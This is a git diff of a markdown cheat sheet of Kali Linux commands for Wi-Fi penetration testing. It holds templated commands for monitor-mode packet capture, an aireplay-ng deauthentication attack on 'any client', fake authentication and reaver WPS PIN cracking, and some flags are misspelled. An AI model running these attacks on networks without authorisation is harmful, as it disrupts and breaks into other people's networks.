@@ -4,22 +4,6 @@ Useful commands in Kali Linux for penetration testing and ethical hacking
 
 ## Basic Linux commands: Device information
 
-View information about your own device. IP addresses, adapters connected, etc... 
-
-```bash
-ifconfig 
-```
-View information about wireless interfaces in your device
-
-```bash
-iwconfig
-```
-To change wireless adapter into monitor mode. Monitor mode allows us to sniff packets through the network
-
-```bash
-iwconfig wlan0 mode monitor
-```
-## Other commands
 1. zip a file: `tar czvf <filename>`
 2. unzip file: `tar xzvf <filename>`
 3. network info: `netstat`
@@ -29,6 +13,9 @@ iwconfig wlan0 mode monitor
 7. change permission: `chmod`
 8. send file to a remote computer: `scp /path/to/file username@remoteIP:~/path/to/file`
 9. From remote server to local computer: `scp username@remoteIP:~/path/to/file /path/to/file` 
+10. View information about your own device: `ifconfig`
+11. Veiw information about wireless interfaces: `iwconfig`
+12. Change wireless adapter into monitor mode: `iwconfig <InterfaceName> mode monitor`
 
 
 
@@ -42,19 +29,15 @@ airodump-ng wlan0
 To sniff packets in the selected network: 
 
 ```bash
-airodump-ng --bssid _____ --channel _ --write _test_ wlan0 
+airodump-ng --bssid <TargetMacAddress> --channel <ChannelOfTargetNetwork> --write <FileName> <interface> 
 ```
-bssid: mac address of target network
-channel: channel of the network
-write: if you want to store the packets in a file
-wlan0: wireless adapter name
 
 The test file will be available with the .cap file. 
 View the .cap file in ```wireshark test.cap```
 
 ## Deauthentication Attack
 
-Disconnect any client form any network
+Disconnect any client fromm any network: 
 
 ```bash
 aireplay-ng --dauth <NumOfPackets> -a <NetworkMacaddress> -c <TargetClientMacAddress> -e <WifiNname> <iterface-wlan0>
@@ -95,7 +78,7 @@ aireplay-ng --fakeauth <30> -a <TargetMacAddress> --interface <wlan0>
 ```bash
 reaver --bssid <TargetMacAddress> --channel <TargetChannel> --interface <wlan0> -vvv --no-associate
 ```
-**NOTE: if bug error, then download older version of reaver and run ./reaver _______ **
+**NOTE: if bug error, then download older version of reaver and run ./reaver ____**
 
 4. Results: WPS PIN and WPA PSK
 
